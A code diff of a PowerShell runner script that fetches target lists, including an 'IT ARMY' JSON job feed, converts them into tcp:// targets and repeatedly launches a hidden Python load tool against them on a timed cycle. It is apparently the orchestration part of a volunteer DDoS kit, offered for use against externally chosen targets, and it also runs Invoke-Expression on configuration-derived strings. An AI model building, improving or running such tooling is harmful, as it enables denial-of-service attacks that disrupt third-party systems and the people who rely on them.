@@ -1,4 +1,3 @@
-#[console]::TreatControlCAsInput = $true
 $host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
 $host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
 
@@ -12,7 +11,70 @@ $SystemDrive = $SystemDrive.Substring(0, 2);
 $InstallFolder = $XMLConfig.config.folders.install;
 $RootDir = $SystemDrive + "\" + $InstallFolder;
 Set-Location $RootDir;
-. "$RootDir\\functions.ps1";
+. $("$RootDir\\functions.ps1");
+
+function CreateTargetList([bool] $RunningLite) {
+    # Adding targets from simple lists.
+    [xml]$XMLConfig = Get-Content -Path ("$PSScriptRoot\\settings.xml");
+    $Targets = @();
+    $TargetLists = $XMLConfig.config.targets.targetlist.entry;
+    foreach ($TargetList in $TargetLists){
+        $TempFilePath = $PSScriptRoot + "\\temp.txt";
+        Get-File $TargetList $TempFilePath;
+        $Targets += [System.IO.File]::ReadAllLines("$TempFilePath");
+        Remove-Item -Force -Path $TempFilePath | Out-Null;
+    }
+    # Adding targets from IT ARMY
+    $ItArmyJSON = $XMLConfig.config.targets.json.itarmy.link;
+    $GotJSON = $false
+    do {
+        #Read the docs before asking questions. Name is intentional.
+        $JsonData = Invoke-RestMethod -Uri $ItArmyJSON -Method Get;
+        if ($null -eq $JsonData.jobs){
+            $GotJSON = $false;
+        }
+        else {
+            $GotJSON = $true;
+        }
+    } while ($GotJSON = $false)
+    $Jobs = $JsonData.jobs;
+    foreach ($Job in $Jobs){
+        $Paths = $XMLConfig.config.targets.json.itarmy.path.entry;
+        foreach ($Path in $Paths) {
+            $SafePath = $Path -replace '(`)*\$', '$1$1`$$';
+            # Generally iex should be avoided. THIS is a rare exception.
+            $Val = Invoke-Expression "`$Job.$SafePath"
+            if ($null -eq $Val){
+                Out-Null;
+            }
+            else {
+                $Targets += "tcp://$Val";
+            }
+        }
+    }
+
+    # Cleanup
+    $Targets = $Targets -join " ";
+    $Targets = $Targets -replace '`n', ' ';
+    $Targets = $Targets -replace '`r', ' ';
+    $Targets = $Targets -replace '`t', ' ';
+    $Targets = $Targets -replace ',', ' ';
+    $Targets = $Targets -replace '  ', ' ';
+    $Targets = $Targets.Replace("tcp)", "tcp");
+    $Targets = $Targets -split " ";
+    if (-not $RunningLite) {
+        $TargetsCleaned = $Targets | Select-Object -Unique | Sort-Object;
+    }
+    else {
+        $TargetsCleaned = $Targets | Select-Object -Unique | Sort-Object { Get-Random };
+    }
+    return $TargetsCleaned
+
+
+}
+
+#[console]::TreatControlCAsInput = $true
+
 
 $PythonPath = $("$RootDir\$($XMLConfig.config.folders.python)\");
 $PythonExe = $PythonPath + "python.exe";
@@ -25,12 +87,12 @@ if (Test-Path $BogusInitPyPath) {
 }
 $LiteBlockSize = [Int] $XMLConfig.config.liteblocksize;
 $MinutesPerBlock = $XMLConfig.config.timers.minutesperblock;
-# DO NOT DO THAT and do not propose that!
+# DO NOT DO THAT and do not propose that! Anyway this shall not work.
 #[Sytem.Environment]::SetEnvironmentVariable('PYTHONPATH', $("$PythonPath; $LoadPath"), [System.EnvironmentVariableTarget]::Process);
 #[System.Environment]::SetEnvironmentVariable('PYTHONHOME', $PythonPath, [System.EnvironmentVariableTarget]::Process);
 
 
-$RunnerVersion = "1.0.1 beta / Trident rhinoceros";
+$RunnerVersion = "1.4 beta / Cossack hog";
 
 if ($args -like "*-lite*") {
     $RunningLite = $true;
@@ -43,7 +105,7 @@ Stop-Runners $LoadPath $PythonExe;
 
 $TargetList = @()
 do {
-    $TargetList = MakeTargetlist $RunningLite;
+    $TargetList = CreateTargetList $RunningLite;
 } while ($TargetList.Count -le 0)
 $TargetsUpdated = [System.DateTime]::Now;
 $StopRequested = $false;
@@ -54,6 +116,8 @@ Set-Location $LoadPath;
 
 
 while (-not $StopRequested) {
+
+    [xml]$XMLConfig = Get-Content -Path ("settings.xml");
     Clear-Host;
     $BannerURL = $XMLConfig.config.links.banner;
     $Banner = Get-Banner $BannerURL;
@@ -84,18 +148,16 @@ while (-not $StopRequested) {
                 $RunnerArgs = $("$LoadFileName $Globalargs -t $LiteBlockSize $TargetString");
                 $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $LoadPath -WindowStyle Hidden -ArgumentList $RunnerArgs -PassThru;
                 $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
-                $StartedBlockJob = [System.DateTime]::Now;
-                $StopBlockJob = $StartedBlockJob.AddMinutes($MinutesPerBlock);
-                $Now = [System.DateTime]::Now;
-                while (($PyProcess.HasExited -eq $false) -and ($StopBlockJob -gt $Now)) {
+                $EndJob = [System.DateTime]::Now.AddMinutes($MinutesPerBlock);
+                $TillEnd = New-Timespan $([System.DateTime]::Now) $EndJob
+                while (($PyProcess.HasExited -eq $false) -and ($TillEnd -gt 0)) {
                     $Now = [System.DateTime]::Now;
-                    $BlockJobLeft = [int] $($StopBlockJob - [System.DateTime]::Now).TotalMinutes;
                     $Message = $XMLConfig.config.messages.targets + `
                         ": $($Target.Count) " + `
                         $XMLConfig.config.messages.targetsupdated + `
                         ": $($TargetsUpdated.ToString("HH:MM"))" + " " + `
                         $XMLConfig.config.messages.tillupdate + `
-                        ": $BlockJobLeft " + `
+                        ": $($TillEnd.TotalMinutes) " + `
                         $XMLConfig.config.messages.minutes + `
                     $(" $(Measure-Bandwith) $($XMLConfig.config.messages.network)");
                     Clear-Line $Message;
@@ -109,26 +171,25 @@ while (-not $StopRequested) {
         $StartTask = $false;
     }
     if (!$RunningLite) {
-        $StopCycle = [System.DateTime]::Now.AddMinutes($MinutesPerBlock);
-        $StopNow = $false;
-        while ($StopCycle -gt $Now -and ($StopNow -eq $false)) {
-            $Now = [System.DateTime]::Now;
-            $BlockJobLeft = [int] $($StopCycle - [System.DateTime]::Now).TotalMinutes;
-            if ($BlockJobLeft -le 0) {
-                # The very appearance of this code block is a proof of mysterious nature of .NET way to interpret the time concept
-                $StopNow = $true;
+        $EndJob = [System.DateTime]::Now.AddMinutes($MinutesPerBlock);
+        $TillEnd = New-Timespan $([System.DateTime]::Now) $EndJob
+        while ($TillEnd -gt 0) {
+            if ($PyProcess.HasExited -eq $true){
+                $StartTask = $true;
+                break;
             }
+            $Now = [System.DateTime]::Now;
             $Message = $XMLConfig.config.messages.targets + `
                         ": $($TargetList.Count) " + `
                         $XMLConfig.config.messages.targetsupdated + `
                         ": $($TargetsUpdated.ToString("HH:MM"))" + " " + `
                         $XMLConfig.config.messages.tillupdate + `
-                        ": $BlockJobLeft " + `
+                        ": $($TillEnd.TotalMinutes) " + `
                         $XMLConfig.config.messages.minutes + `
                     $(" $(Measure-Bandwith) $($XMLConfig.config.messages.network)");
             Clear-Line $Message;
         }
-        $NewTargetList = MakeTargetlist $RunningLite;
+        $NewTargetList = CreateTargetList $RunningLite;
         if ($TargetList.Count -eq $NewTargetList.Count) {
             $StartTask = $false;
         }
@@ -141,7 +202,7 @@ while (-not $StopRequested) {
     }
 
     if ($RunningLite) {
-        $TargetList = MakeTargetlist $RunningLite;
+        $TargetList = CreateTargetList $RunningLite;
         $TargetsUpdated = [System.DateTime]::Now;
         Stop-Runners $LoadPath $PythonExe;
     }
